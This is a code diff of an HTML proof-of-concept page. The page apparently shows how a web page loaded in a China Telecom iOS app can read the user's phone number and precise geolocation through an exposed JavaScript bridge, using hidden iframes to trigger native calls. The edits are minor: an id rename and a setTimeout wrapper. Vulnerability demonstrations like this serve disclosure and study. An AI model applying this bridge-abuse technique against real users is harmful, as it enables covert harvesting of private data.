@@ -50,8 +50,7 @@
     <p><span class="bold-and-larger">An attacker can:</span></p>
 
     <p><span class="larger">Get Your User Info:</span></p>
-    <p style="font-size: 15px;" id="PhoneNum"></p>
-
+    <p style="font-size: 15px;" id="PhoneNumber"></p>
 
     <p><span class="larger">Get Your Geolocation Info:</span></p>
     <p style="font-size: 15px;" id="Country"></p>
@@ -62,13 +61,14 @@
 
     <script>
 
-        function fetchData(url) {
-            var iframe = document.createElement("iframe");
-            iframe.style.cssText = "display:none;width:0px;height:0px;";
-            iframe.src = url;
-            document.body.appendChild(iframe);
-        }
+    function fetchData(url) {
+        var iframe = document.createElement("iframe");
+        iframe.style.cssText = "display:none;width:0px;height:0px;";
+        iframe.src = url;
+        document.body.appendChild(iframe);
+    }
 
+    setTimeout(function () {
         getLocationInformationResult = function (longitude, latitude) {
             document.getElementById("PreciseGeolocation").innerText = "Your Precise Geolocation: \n" + " (" + longitude + ", " + latitude + ")";
         }
@@ -85,6 +85,7 @@
 
         document.getElementById("PhoneNumber").innerText = "Your Phone Number: " + ChinatelecomData_iOS_JS_Bridge.chinatelecomdata_login_id;
 
+    }, 500);
 
     </script>
 
